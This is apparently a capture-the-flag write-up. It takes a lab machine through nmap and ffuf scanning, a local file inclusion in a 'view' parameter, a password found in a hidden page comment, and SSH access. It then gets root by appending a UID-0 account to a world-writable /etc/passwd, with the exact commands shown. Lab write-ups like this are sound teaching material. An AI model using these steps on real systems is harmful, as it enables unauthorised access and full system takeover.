24 sep 2021 
-----------------

# Scanning

*intial*
```bash
export IP=3.127.142.53
nmap -sV -v $IP -oN nmap/intial
```
*Results*
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```


# Enumeration

*directory brute-force*
```bash
ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://3.127.142.53/FUZZ  
```

```bash
index.php               [Status: 200, Size: 791, Words: 109, Lines: 15]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```

*Exploring web application*

the parameter `view` which is used when press on tabs in the page is vulnerable to lfi , we can read /etc/passwd

![image](https://user-images.githubusercontent.com/67979878/134611976-39f1a9fa-ab68-4568-8f4e-4d8b58f9a0cc.png)

- checking the source codes of the pages we can see at contact downthere in the page

```
<!-- my0wns3cr3t.sec -->
```

let's try access /my0wns3cr3t.sec , it returns a base64 encoded text let's see

after some decoding we have `B100dyPa$$w0rd` seems a password ,but for who ?

we have 2 potential users: 
```
john 
ubuntu
```
let's try ssh to any of them .

yes it is for john :D 

# privilege escalation Factors 

running linuxEnum.sh we can see this part :
```
Can we read/write sensitive files:
-rwxrwxrwx 1 root root 1657 Sep 24 03:30 /etc/passwd
```

so we can simply create a new user as a group root !

```bash
openssl passwd hacker          
GlkByIs88VWGM
```
using :

Mesbah:GlkByIs88VWGM:0:0:root:/root:/bin/bash
```bash
echo "Mesbah:GlkByIs88VWGM:0:0:root:/root:/bin/bash" >> /etc/passwd
```
![image](https://user-images.githubusercontent.com/67979878/134614702-391454e2-ab99-4ac5-9fc9-36c023ebd1f7.png)
